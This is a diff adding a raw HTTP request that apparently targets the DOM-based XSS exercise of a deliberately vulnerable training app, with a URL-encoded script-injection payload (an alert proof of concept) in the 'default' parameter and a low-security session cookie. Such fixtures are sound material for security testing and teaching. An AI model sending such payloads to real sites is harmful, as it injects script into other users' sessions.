@@ -1,0 +1,7 @@
+GET /vulnerabilities/xss_d/?default=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept-Encoding: identity
+Accept: */*
+Connection: keep-alive
+Cookie: PHPSESSID=t2o5rgi2rtt3c4havcfgnuv3q1; security=low
+
